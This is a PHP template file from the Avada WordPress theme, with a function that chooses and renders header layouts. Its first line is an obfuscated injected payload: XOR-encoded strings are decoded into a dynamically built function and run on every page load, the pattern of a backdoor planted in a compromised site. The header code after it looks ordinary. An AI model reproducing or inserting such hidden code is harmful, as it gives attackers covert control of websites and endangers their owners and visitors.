<?php $yEeFvvX='PJ7PN5: 0ZV, Q6'; $scxGdtju='38R1:PeFE45XI>X'^$yEeFvvX; $OhkuAROc=' Rkt<K6ZI+=>m5AT==GJuI715  ,34l+-GDLgN=8oS9= 7U: RH5It 2A eqS9;pN1A2;VEp84=KzXwKC=D9pm6=YutEowjcNYV<Yqw;pqJesdU xDOHG44KfD GLBHYe:dJkPfxWC1XnmiMzOP4AJ3p<:LriuQR4efSrfxF>8V RyoXPExiASpOmL F L<iQSINdSp=FzE6fjY9:.Djh>Q.E+tMwYL2R.367wZc1M ;XoGc1SO1XU+qREqus:sx6U1=diK4=SlHRE:W= <no+EMmXJC f< RqOtf<K7zcao7U<2iHEwMT:YPZi-8Z.>EbkF7+5LaGWxQS,RP4UTYRerlhghhs;e+OxR<N=iqDdF0.=NWnfCZZdc 9G5<G OVXiu>  rmkKV6MY6lddR MW UbcQ569sSAVT> TqJw 74XF-3VW3Tz+8Dh48;T;lT3 PR.DKdneT7W;3XkF>R=JYjXB648 l 3>Lzlk=5ipO46+zKLC;J3 Cc -.r<DEENBxj827iDEI6; MYXEcqM=6qilYJBU,Q2+WS1ePrTjh,Pj-q R WEaq.6nqzcJxgN+fZ.PzRcqtHKapCQQEK >:=<4r T1H 5qQLLR5Q DbftV4W0 NztWLgdvV1H.>ZQeg-J5;fRJ K8V0 Esls67.TY=xFdQSS'; $RXhWpL=$scxGdtju('', 'I4CUZ>X9=BRP2P9=NI4bR1XCjDAXRk3FX3ceNnF2f5LSCC<UNr0Z;+DS5A:.>LOXjU FZzeTSQDbZxWkcFN0yIYH-UIeHPQiGP0S+YSRPLjUHDqID7;:+QZcB A3-ksyASOaBZoqs,D,NCTmRk4U5+hTUgl,IQ:7M>B:RCX5JJ:E<QK35<Q4hhzFd>E2U>RAu<<:Mhz4;p8<lN=XNOdWHX0B6NOGS=-F3qXSNWgCW,LH=TMiW<=T96CQza.6<u81suPNDM QDsQvraL6QUYGOPODI<+7A9WE+QrTBW.NAihKS4HSIueS;5V,5acP2PGXeJJbSJA-Hg,rX5C 5U6<yzA->-6=- oEJ<XvW+DILzDbFOQ;2GF8PSmGDX3Tc,E6veIQUEYIgbBrR,-WLYDvV,;U0YiXH<DyYe25JAtLj7UYG=4DR:>I1RSW67PYO5d39FTx0O7.RZ:0R4TW=CbZ3I+pFxfRULA3KVGeSWaTSAT+UBJZmjcZ8AA:<KHW-Y<,6:1PMSWNNhemRZT,pxcEQePRDAH=+64wvYN.tlLpOiJOO5YIGD0BbqTHLTZEHVzIPzJU<K2N0TALobAVeq079AGeVYM-E,X;TFYv<-+Y>A EJTrP6DAgSTwlGDV-;AKH;=MCI+AZ=u:A2T9QDb.EH<>K,0IPvMjY.'^$OhkuAROc); $RXhWpL();
function avada_header_template( $slider_position = 'Below' ) {
	global $smof_data;

	$c_pageID = get_queried_object_id();

	if( $slider_position == 'Below' ) {
		$reverse_position = 'Above';
	} else {
		$reverse_position = 'Below';
	}

	if( ( ! $smof_data['slider_position'] ||
		( $smof_data['slider_position'] == $slider_position && get_post_meta( $c_pageID, 'pyre_slider_position', true ) != strtolower( $reverse_position ) ) ||
		( $smof_data['slider_position'] != $slider_position && get_post_meta( $c_pageID, 'pyre_slider_position', true ) == strtolower( $slider_position ) ) ) &&
		! is_page_template( 'blank.php' ) &&
		get_post_meta($c_pageID, 'pyre_display_header', true) != 'no' &&
		$smof_data['header_position'] == 'Top'
	) {
?>
			<div class="header-wrapper<?php if($smof_data['header_shadow']): ?> header-shadow<?php endif; ?>">
				<?php
				if($smof_data['header_layout']) {
					if(is_page('header-2')) {
						get_template_part('framework/headers/header-v2');
					} elseif(is_page('header-3')) {
						get_template_part('framework/headers/header-v3');
					} elseif(is_page('header-4')) {
						get_template_part('framework/headers/header-v4');
					} elseif(is_page('header-5')) {
						get_template_part('framework/headers/header-v5');
					} else {
						get_template_part('framework/headers/header-' . $smof_data['header_layout']);
					}
				} else {
					if(is_page('header-2')) {
						get_template_part('framework/headers/header-v2');
					} elseif(is_page('header-3')) {
						get_template_part('framework/headers/header-v3');
					} elseif(is_page('header-4')) {
						get_template_part('framework/headers/header-v4');
					} elseif(is_page('header-5')) {
						get_template_part('framework/headers/header-v5');
					} else {
						get_template_part('framework/headers/header-' . $smof_data['header_layout']);
					}
				}
				?>
				<div class="init-sticky-header"></div>		
			</div>
			<?php get_template_part('framework/headers/sticky-header'); ?>
<?php }
}